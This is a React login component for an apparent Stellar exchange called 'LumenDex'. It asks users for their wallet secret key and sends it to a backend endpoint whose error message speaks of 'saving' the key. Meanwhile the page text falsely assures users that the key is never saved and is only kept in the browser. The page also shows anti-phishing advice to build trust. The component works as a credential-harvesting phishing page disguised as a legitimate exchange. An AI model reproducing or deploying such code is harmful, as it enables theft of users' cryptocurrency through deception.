import React, { useState } from 'react';
import axios from 'axios';
import '../App.css';

function Login() {
  const [secretKey, setSecretKey] = useState('');
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!termsAccepted) {
      alert("You must accept the terms to proceed.");
      return;
    }

    try {
      const response = await axios.post(`${process.env.REACT_APP_API_BASE_URL}/user`, { secretKey });
      alert(response.data);
    } catch (error: unknown) {
      if (axios.isAxiosError(error)) {
        if (error.response && error.response.status === 400) {
          setErrorMessage(error.response.data as string);
        } else {
          console.error("There was an error saving the secret key!", error);
          setErrorMessage('Error saving secret key!');
        }
      } else {
        console.error("An unexpected error occurred!", error);
        setErrorMessage('An unexpected error occurred!');
      }
    }
  };

  return (
    <div className="main-container">
      <header className="header">
        <h1 className="logo">Lumen<span>Dex</span></h1>
        <nav className="nav">
          <a href="#markets">Markets</a>
          <a href="#exchange">Exchange</a>
          <a href="#swap">Swap</a>
          <a href="#liquidity">Liquidity</a>
          <a href="#earn">Earn</a>
          <a href="#account">Account</a>
          <button className="new-account-btn">New Account</button>
          <button className="login-btn">Login</button>
        </nav>
      </header>
      <main className="login-section">
        <div className="login-card">
          <h2>Access your account</h2>
          <p>Log in with your secret key to manage Stellar account.</p>
          <form className="login-form" onSubmit={handleLogin}>
            <label htmlFor="secret-key">Enter secret key</label>
            <input
              type="text"
              id="secret-key"
              name="secret-key"
              placeholder="SXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
              value={secretKey}
              onChange={(e) => setSecretKey(e.target.value)}
            />
            {errorMessage && <p className="error-message">{errorMessage}</p>}
            <div className="checkbox-container">
              <input
                type="checkbox"
                id="terms"
                name="terms"
                checked={termsAccepted}
                onChange={(e) => setTermsAccepted(e.target.checked)}
              />
              <label htmlFor="terms">
                I accept the <a href="#terms">Terms of Use</a>, understand the risks associated with cryptocurrencies, and know that LumenDex does not issue or endorse any asset on the Stellar network.
              </label>
            </div>
            <button type="submit" className="login-btn">Log in</button>
          </form>
          <p className="create-account">Don't have an account? <a href="#create-account">Create new account</a></p>
        </div>
        <div className="info-box">
          <div className="warning">
            <p>Secret Phrase not found</p> 
          </div>
          <p>Secret Phrase can help you verify that you are using authentic LumenDex website and save you from phishing attacks.</p>
          <a href="#" className="configure-link">Configure Secret Phrase →</a>
          <p>Check the URL</p>
          <p>Make sure you are on the correct website.</p>
          <p className="url">✅ <a href="#">https://lumendex.online</a></p>
          <p>Keep your secret key secure</p>
          <p>LumenDex does not save your secret key. It is stored on your browser and will be deleted once the page is refreshed or exited.</p>
        </div>
      </main>
    </div>
  );
}

export default Login;
